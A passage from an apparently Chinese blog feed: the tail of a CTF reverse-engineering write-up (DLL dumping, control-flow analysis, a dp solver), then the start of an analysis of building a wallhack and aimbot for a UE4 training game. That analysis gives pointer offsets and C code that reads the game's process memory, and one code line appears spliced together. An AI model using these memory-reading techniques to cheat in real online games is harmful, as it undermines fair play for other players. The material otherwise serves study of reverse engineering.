class="hljs-number">0x67616c66</span>) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-comment"># flag</span><br>    ecx = ecx ^ eax ^ (edx + flag4) &amp; <span class="hljs-number">0xffffffff</span><br>    flag3 = (flag3 - ecx) &amp; <span class="hljs-number">0xffffffff</span><br><br>flag3 = flag3.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>).decode()<br>flag4 = flag4.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>).decode()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag1+flag2+flag3+flag4+<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-comment"># flag&#123;msiexec.is.1nfected&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="ClimbToTop"><a href="#ClimbToTop" class="headerlink" title="ClimbToTop"></a>ClimbToTop</h2><p>攻防世界上名字是babydsp，但应该不太对</p><p>给了dump文件和pdb文件，用windbg看了半天没看处理咋下一步，换ida</p><p><img src="assets/2023-11-19-01-09-23-image.png"></p><p>直接把可执行文件dump出来</p><p>加载一下pdb文件之后看主函数</p><p><img src="assets/2023-11-19-01-10-52-image.png"></p><p>这里的Detour把<code>LockResource</code>hook了，但代码有问题，跑不了</p><p><img src="assets/2023-11-19-01-13-17-image.png"></p><p>把原本的Detour代码patch调，受用调用<code>NewLockResource</code>，需要修复一下<code>pfnLockResource</code>的地址，还有给<code>.rsrc</code>段加可写权限</p><p><code>LoadRemoteLibraryR</code>函数看名字应该是加载DLL的</p><p><img src="assets/2023-11-19-01-20-54-image.png"></p><p><img src="assets/2023-11-19-01-21-31-image.png"></p><p>rdx指向了一个PE文件，r8是长度，dump下来</p><p><img src="assets/2023-11-19-01-22-55-image.png"></p><p>识别DllMain函数了，看了一下主要逻辑在main里面，这里生成了很多的随机数</p><p>写个简单的程序加载dump下来的dll，方便调试</p><p><img src="assets/2023-11-19-01-24-27-image.png"></p><p>主函数的开头跟结尾都很好分析</p><p><img src="assets/2023-11-19-01-28-53-image.png"></p><p><img src="assets/2023-11-19-01-29-24-image.png"></p><p>输入长度为0xc0的01串，转换为字节之后跟flag异或得到flag字符串，关键在中间的部分</p><p>主函数里一堆switch case</p><p><img src="assets/2023-11-19-01-26-33-image.png"></p><p>尝试了些控制流平坦化的脚本，没啥用，跳转是靠rcx</p><p><img src="assets/2023-11-19-01-27-28-image.png"></p><p>手动分析每一个case块</p><p><img src="assets/2023-11-19-01-30-47-image.png"></p><p><img src="assets/2023-11-19-01-31-07-image.png"></p><p><img src="assets/2023-11-19-01-31-24-image.png"></p><p><img src="assets/2023-11-19-01-31-50-image.png"></p><p><img src="assets/2023-11-19-01-32-14-image.png"></p><p><img src="assets/2023-11-19-01-32-34-image.png"></p><p><img src="assets/2023-11-19-01-32-54-image.png"></p><p><img src="assets/2023-11-19-01-33-28-image.png"></p><p>主要是根据v8进行跳转，然后做一系列的操作，<code>case 0x50</code>和<code>case 0x51</code>配合可以循环操作</p><p>控制流序列如下，中间有一些地址用来是部分块用来寻址存取数据用的</p><p><img src="assets/2023-11-19-01-35-03-image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python">control_flow = [<br>    <span class="hljs-number">0x81</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x7F</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x32</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x82</span>,<br>    <span class="hljs-number">0x83</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x7F</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xFE</span>,<br>    <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x00</span>]<br><br><br><span class="hljs-comment"># case 0x81</span><br>v12 = <span class="hljs-number">0x29</span><br><br><span class="hljs-comment"># case 0x34</span><br>dword_7FFE04B55690 = v12<br><br><span class="hljs-comment"># case 0x31</span><br>v11 = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># case 0x32</span><br>v10 = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#case 0x33</span><br>v9 = <span class="hljs-number">0xc2</span><br><br><span class="hljs-comment"># case 0x50</span><br>dword_7FFDEB55568C = v8<br><br><span class="hljs-comment"># case 0x7</span><br>v9 += <span class="hljs-number">0xc2</span><br><br><span class="hljs-comment"># case 0x82</span><br>v12 = getchar()<br><br><span class="hljs-comment"># case 0x83</span><br><span class="hljs-keyword">if</span> (v12 == <span class="hljs-string">&#x27;1&#x27;</span>):<br>    v10 += <span class="hljs-number">1</span><br>v12 = dword_7FFDEB5556A0[v9 + v10]<br><br><span class="hljs-comment"># case 0x8</span><br>v12 += dword_7FFE04B55690<br><br><span class="hljs-comment"># case 0x34</span><br>dword_7FFE04B55690 = v12<br><br><span class="hljs-comment"># case 0x5</span><br>v11 += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># case 0x40</span><br><span class="hljs-keyword">if</span> (v11 &gt; <span class="hljs-number">0xc0</span>):<br>    fl = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> (v11 == <span class="hljs-number">0xc0</span>):<br>    fl = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> (v11 &lt; <span class="hljs-number">0xc0</span>):<br>    fl = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># case 0x51</span><br><span class="hljs-keyword">if</span> (fl == <span class="hljs-number">1</span>):<br>    v8 = dword_7FFE04B5568C<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>分析了一下，控制流在<code>case 0x50</code>和<code>case 0x51</code>之间循环，每次取出一个输入序列</p><p>类似于dp算法题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span><br><span class="hljs-number">12</span> <span class="hljs-number">5</span><br><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span><br><span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">10</span><br>...<br></code></pre></td></tr></table></figure><p>第i层有i个数，输入为1时向右下走，输入0时向下走，对路径上的数字求和</p><p>这里的数字是在<code>DllMain</code>中rand生成的，实际上不随机，之间全dump下来，写代码尝试dp求最大值找路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 输入1往右走一格</span><br><span class="hljs-comment"># 从rand生成的数里取数字 求和</span><br>rand_ls = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rand_dump.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.seek(<span class="hljs-number">0x30c</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xc2</span>):<br>        l = []<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xc2</span>):<br>            data = f.read(<span class="hljs-number">4</span>)<br>            l.append(<span class="hljs-built_in">int</span>.from_bytes(data, byteorder=<span class="hljs-string">&quot;little&quot;</span>))<br>        rand_ls.append(l)<br><br><br><span class="hljs-comment"># 猜测需要找最大路径 dp</span><br>dp = [[<span class="hljs-number">0</span>, [<span class="hljs-string">&quot;&quot;</span>]] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xc1</span>)]<br>dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = rand_ls[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0xc1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 当前位置的最大值可能为上一层之间向下走，也可能是左侧走过来</span><br>        <span class="hljs-keyword">if</span> (rand_ls[i-<span class="hljs-number">1</span>][j] == rand_ls[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]):<br>            dp[j][<span class="hljs-number">0</span>] = dp[j][<span class="hljs-number">0</span>] + rand_ls[i][j]<br>            tmp = []<br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dp[j-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]:<br>                tmp.append(s + <span class="hljs-string">&quot;1&quot;</span>)<br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dp[j][<span class="hljs-number">1</span>]:<br>                tmp.append(s + <span class="hljs-string">&quot;0&quot;</span>)<br>            dp[j][<span class="hljs-number">1</span>] = tmp<br>        <span class="hljs-keyword">elif</span> (rand_ls[i-<span class="hljs-number">1</span>][j] &gt; rand_ls[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]):<br>            dp[j][<span class="hljs-number">0</span>] = dp[j][<span class="hljs-number">0</span>] + rand_ls[i][j]<br>            tmp = []<br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dp[j][<span class="hljs-number">1</span>]:<br>                tmp.append(s + <span class="hljs-string">&quot;0&quot;</span>)<br>            dp[j][<span class="hljs-number">1</span>] = tmp<br>        <span class="hljs-keyword">else</span>:<br>            dp[j][<span class="hljs-number">0</span>] = dp[j-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + rand_ls[i][j]<br>            tmp = []<br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dp[j-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]:<br>                tmp.append(s + <span class="hljs-string">&quot;1&quot;</span>)<br>            dp[j][<span class="hljs-number">1</span>] = tmp<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + rand_ls[i][<span class="hljs-number">0</span>]<br>    tmp = []<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dp[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]:<br>        tmp.append(s + <span class="hljs-string">&quot;0&quot;</span>)<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp<br><br><br><span class="hljs-built_in">print</span>(dp)<br><span class="hljs-built_in">max</span> = <span class="hljs-number">0</span><br>path = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xc1</span>):<br>    <span class="hljs-keyword">if</span> (dp[i][<span class="hljs-number">0</span>] &gt;= <span class="hljs-built_in">max</span>):<br>        <span class="hljs-built_in">max</span> = dp[i][<span class="hljs-number">0</span>]<br>        path = dp[i][<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">max</span>, path)<br></code></pre></td></tr></table></figure><p>但是得到的最大值路径异或flag得不到正确的flag，题目也没有其他校验和提示，纯谜语，放弃思考</p>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UE4外挂实现分析-PC端</title>
    <link href="/2023/11/12/TencentGameClient/UE4%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-PC%E7%AB%AF/"/>
    <url>/2023/11/12/TencentGameClient/UE4%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-PC%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="游戏分析"><a href="#游戏分析" class="headerlink" title="游戏分析"></a>游戏分析</h3><blockquote><p>分析工具：</p><p><a href="https://github.com/cheat-engine/cheat-engine">Cheat Engine 7.5</a></p><p><a href="https://github.com/x64dbg/x64dbg">x64dbg</a></p><p><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></p></blockquote><blockquote><p>参考文章：</p><p><a href="http://www.pentester.top/index.php/archives/117/">UE4逆向笔记之GWORLD GName GameInstance - 小透明‘s Blog</a></p></blockquote><p>本次分析的游戏使用UE4.22引擎开发，外挂实现功能有透视和自瞄，两项功能都基于游戏内玩家对象和敌人对象的坐标位置实现。UE4游戏内对象的结构如下图所示</p><p><img src="assets/2023-11-12-18-23-09-4234669859.png"></p><blockquote><p>图片中的对象偏移与UE引擎版本相关，存在误差。</p></blockquote><p>根据上图的关系，游戏中所有的对象都挂在<code>UWorld</code>下面，通过<code>UWorld-&gt;GameInstance-&gt;ULocalPlayer-&gt;LocalPlayer-&gt;PlayerController-&gt;Actor</code>可以获取到游戏玩家的Actor对象，进而获取玩家的坐标等信息</p><p>通过<code>PWorld-&gt;ULevel-&gt;ActorCount</code>和<code>PWorld-&gt;ULevel-&gt;ActorArray</code>可以遍历游戏中所有的Actor对象，包括敌人的Actor对象，进而获取敌人坐标信息，在一局游戏中，<code>PWorld</code>指针与<code>UWorld</code>相同</p><h4 id="CE分析UWorld"><a href="#CE分析UWorld" class="headerlink" title="CE分析UWorld"></a>CE分析UWorld</h4><p>开启游戏使用CE打开游戏进程</p><p>寻找游戏内能直接获取的与玩家信息有关的详细数据，游戏中子弹数量能够直接查看到准确数值，并且方便控制，因此使用CE查找子弹数量的地址</p><p>首先搜索准确的32位整数50</p><p><img src="assets/2023-11-12-18-45-27-image.png"></p><p>开枪减少子弹数量，继续搜索48</p><p><img src="assets/2023-11-12-18-46-13-image.png"></p><p>只剩两个地址，修改这两个地址处的值，查看游戏内子弹数量是否发生变化，</p><p><img src="assets/2023-11-12-18-48-17-image.png"></p><p>可以确定子弹数量储存在<code>0x1E3EDF40684</code>地址处，对该地址进行指针分析</p><p><img src="assets/2023-11-12-18-50-35-image.png"></p><p>根据<code>GameInstance</code>到<code>PlayerController</code>的偏移关系<code>0x38 -&gt; 0x0 -&gt; 0x30</code>过虑到如下指针链</p><p><img src="assets/2023-11-12-18-55-50-image.png"></p><p>其中存在条指针链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;ShooterClient.exe&quot;</span>+<span class="hljs-number">02F</span>6E6E8-&gt;<span class="hljs-number">0xD80</span>-&gt;<span class="hljs-number">0x38</span>-&gt;<span class="hljs-number">0x0</span>-&gt;<span class="hljs-number">0x30</span>-&gt;<span class="hljs-number">0x3B0</span>-&gt;<span class="hljs-number">0x778</span>-&gt;<span class="hljs-number">0x584</span><br><span class="hljs-string">&quot;ShooterClient.exe&quot;</span>+<span class="hljs-number">02F</span>71060-&gt;<span class="hljs-number">0x160</span>-&gt;<span class="hljs-number">0x38</span>-&gt;<span class="hljs-number">0x0</span>-&gt;<span class="hljs-number">0x30</span>-&gt;<span class="hljs-number">0x3B0</span>-&gt;<span class="hljs-number">0x778</span>-&gt;<span class="hljs-number">0x584</span><br></code></pre></td></tr></table></figure><p>因此可以分析出<code>UWorld</code>为<code>ShooterClient.exe+02F6E6E8</code>或<code>ShooterClient.exe+02F71060</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">UWorld = [ShooterClient.exe+<span class="hljs-number">0x02F71060</span>]<br>GameInstance = [UWorld+<span class="hljs-number">0x160</span>]<br>ULocalPlayer = [GameInstance+<span class="hljs-number">0x38</span>]<br>LocalPlayer=[ULocalPlayer]<br>PlayerController = [LocalPlayer+<span class="hljs-number">0x30</span>]<br>PlayerActor = [PlayerController+<span class="hljs-number">03B</span>0]ReadProcessMemory(hProcess, (LPVOID)((BYTE*)baseAddr + <span class="hljs-number">0x2E6E0C0</span>), (LPVOID)&amp;GName, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>继续使用浮点数模糊搜索玩家坐标、视角信息等，由于已经确定玩家子弹数量地址，因此可以缩小搜索范围在<code>0x1E3EDF40684</code>附近</p><p>得到如下指针信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">bullet = [[PlayerActor+<span class="hljs-number">0x778</span>]+<span class="hljs-number">0x584</span>]<br>posi_x = [[PlayerActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A0</span>]<br>posi_y = [[PlayerActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A4</span>]<br>posi_z = [[PlayerActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A8</span>]<br>persp_x = [[PlayerActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x154</span>]<br>persp_y = [[PlayerActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x174</span>]<br></code></pre></td></tr></table></figure><p>基于上述信息，还能确定<code>ULevel</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ULevel = [UWorld+<span class="hljs-number">0x30</span>]<br></code></pre></td></tr></table></figure><p><code>ActorCount</code>和<code>ActorArray</code>的偏移可以使用CE的结构体分析功能</p><p><img src="assets/2023-11-12-19-16-56-image.png"></p><p>经过分析，确定<code>ActorCount</code>和<code>ActorArray</code>的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ActorCount = [ULevel+<span class="hljs-number">0xA0</span>]<br>ActorArray = [ULevel+<span class="hljs-number">0x98</span>]<br></code></pre></td></tr></table></figure><p>遍历<code>ActorArray</code>可以获得游戏内所有的Actor对象，包含了敌人对象，但还需要识别是否为敌人，所以还需要查找对象的Name</p><h4 id="CE分析GName"><a href="#CE分析GName" class="headerlink" title="CE分析GName"></a>CE分析GName</h4><p>UE4.23以下版本使用的GName算法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">BYTE *<span class="hljs-title function_">GetName</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx0 = id / <span class="hljs-number">0x4000</span>;<br>    <span class="hljs-type">int</span> idx1 = id % <span class="hljs-number">0x4000</span>;<br>    BYTE *NameArray = [GName + idx0 * <span class="hljs-number">8</span>];<br>    BYTE *Name = [NameArray + idx1 * <span class="hljs-number">8</span>] + <span class="hljs-number">0xC</span>;<br>    <span class="hljs-keyword">return</span> Name;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用CE搜索进程内存，查找关键字符串<code>ByteProperty</code></p><p><img src="assets/2023-11-12-19-32-21-image.png"></p><p>如果上一个字符串为<code>None</code>，则表示搜索到了正确位置，此处为游戏对象的Name表</p><p>由于<code>ByteProperty</code>字符串id为1,可以根据<code>GetName</code>算法逆推GName</p><p>搜索地址<code>0x1E3D5EA0024-0xC</code></p><p><img src="assets/2023-11-12-19-35-24-image.png"></p><p>搜索<code>0x1E3D5E80008-1*8</code></p><p><img src="assets/2023-11-12-19-36-50-image.png"></p><p>搜索<code>0x1E3D5E70080</code></p><p><img src="assets/2023-11-12-19-37-47-image.png"></p><p>可以确定GName为<code>ShooterClient.exe+2D310B0</code>或<code>ShooterClient.exe+2E6E0C0</code></p><p>编写代码验证上述分析的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    LPCWSTR procName = <span class="hljs-string">L&quot;ShooterClient.exe&quot;</span>;<br>    DWORD dwPID;<br>    HANDLE hProcess;<br>    LPVOID baseAddr;<br>    dwPID = getDwPidByName(procName);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PID: %d\n&quot;</span>, dwPID);<br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open process failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    baseAddr = getModuleBase(dwPID);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;proc base: 0x%llx\n&quot;</span>, baseAddr);<br><br>    LPVOID UWorld;<br>    LPVOID GName;<br>    LPVOID GameInstance;<br>    LPVOID ULocalPlayer;<br>    LPVOID LocalPlayer;<br>    LPVOID PlayerController;<br>    LPVOID PlayerActor;<br>    LPVOID PlayerPosition;<br>    LPVOID ULevel;<br>    DWORD ActorCount;<br>    LPVOID ActorArray;<br>    <span class="hljs-comment">// 读取UWorld</span><br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)baseAddr + <span class="hljs-number">0x02F71060</span>), (LPVOID)&amp;UWorld, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)UWorld + <span class="hljs-number">0x160</span>), (LPVOID)&amp;GameInstance, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)GameInstance + <span class="hljs-number">0x38</span>), (LPVOID)&amp;ULocalPlayer, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)ULocalPlayer, (LPVOID)&amp;LocalPlayer, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)LocalPlayer + <span class="hljs-number">0x30</span>), (LPVOID)&amp;PlayerController, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PlayerController + <span class="hljs-number">0x3B0</span>), (LPVOID)&amp;PlayerActor, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UWorld: 0x%llx\n&quot;</span>, UWorld);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GameInstance: 0x%llx\n&quot;</span>, GameInstance);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ULocalPlayer: 0x%llx\n&quot;</span>, ULocalPlayer);<br>    <span 